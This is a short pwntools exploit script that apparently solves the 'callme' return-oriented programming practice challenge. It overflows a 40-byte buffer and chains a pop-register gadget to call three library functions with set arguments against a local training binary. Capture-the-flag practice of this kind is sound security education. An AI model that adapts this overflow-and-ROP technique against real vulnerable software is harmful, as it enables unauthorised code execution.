from pwn import *

# overflow@40
# 0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;

#context.log_level = "debug"

e = ELF("callme")
elib = ELF("libcallme.so")

p = process(e.path)
junk = "A" * 40
popvars = p64(0x401ab0)

# 0000000000401810 <callme_three@plt>:
#   401810:	ff 25 12 08 20 00    	jmpq   *0x200812(%rip)        # 602028 <callme_three>
# 0000000000401850 <callme_one@plt>:
#   401850:	ff 25 f2 07 20 00    	jmpq   *0x2007f2(%rip)        # 602048 <callme_one>
# 0000000000401870 <callme_two@plt>:
#   401870:	ff 25 e2 07 20 00    	jmpq   *0x2007e2(%rip)        # 602058 <callme_two>

callme_one = p64(0x401850)
callme_two = p64(0x401870)
callme_three = p64(0x401810)

callme_one = p64(e.sym.callme_one)
callme_two = p64(e.sym.callme_two)
callme_three = p64(e.sym.callme_three)

one = p64(1)
two = p64(2)
three = p64(3)

chain = junk 
chain += popvars + one + two + three + callme_one
chain += popvars + one + two + three + callme_two
chain += popvars + one + two + three + callme_three

p.sendline(chain)
print(p.readall())